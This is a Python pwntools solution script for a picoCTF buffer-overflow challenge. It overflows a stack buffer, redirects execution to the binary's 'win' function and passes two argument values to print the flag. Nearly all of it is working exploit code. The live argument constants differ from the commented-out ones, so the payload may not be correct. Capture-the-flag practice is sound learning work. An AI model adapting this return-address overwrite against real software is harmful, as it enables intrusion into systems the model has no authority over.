'''
tags: `bof`

bof and return to function that read and print flag
need to match certain argument
'''
from pwn import *

host = 'saturn.picoctf.net'
port = 60277

elf = ELF('./vuln')

context.binary = elf
context.terminal = ['tmux', 'splitw', '-v']

gdb_script = '''
b win
b *0x0804930c
'''

# symbols
vuln_func = elf.symbols['win']

def conn():
    if args.EXPLOIT:
        r = remote(host, port)
    else:
        if args.LD_PRELOAD:
            import os
            r = process([elf.path], env={**os.environ, "LD_PRELOAD": args.LD_PRELOAD})
        else:
            r = process([elf.path])
        if args.GDB:
            gdb.attach(r, gdb_script)
    return r

def solve(r):
    r.recvuntil(b'Please enter your string: \n')
    padding = cyclic_find(0x62616164)
    payload = b'a' * padding
    payload += p32(vuln_func)
    payload += b'a' * cyclic_find(0x61616162)
    # payload += p32(0xCAFEF00D)
    # payload += p32(0xF00DF00D)
    payload += p32(0xB8DF0300)
    payload += p32(0x00C1E807)
    r.sendline(payload)
    r.recvline()
    print (r.recvuntil(b'}').decode())

if __name__ == '__main__':
    r = conn()
    solve(r)
    r.close()
